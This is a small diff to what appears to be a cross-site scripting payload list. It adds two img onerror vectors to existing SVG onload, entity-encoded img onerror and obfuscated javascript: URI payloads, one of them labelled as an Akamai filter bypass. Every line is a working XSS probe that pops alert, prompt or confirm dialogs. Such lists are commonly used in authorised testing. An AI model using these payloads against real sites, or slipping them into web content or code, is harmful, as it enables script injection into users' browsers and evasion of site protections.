@@ -2,6 +2,8 @@
 '"<Svg%20One%20OnLoad=confirm\(1\)\>
 --!><Svg/Onload=confirm`cookie`>
 <img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`akamaibypass`;>
+<img/src="x"/onerror="prompt(7*7)">
+<img src="x" onerror="console.log(7*7)">
 javascript:prompt(1)
 javascri%0dpt:prompt()
 [SPASI]javascript:prompt()
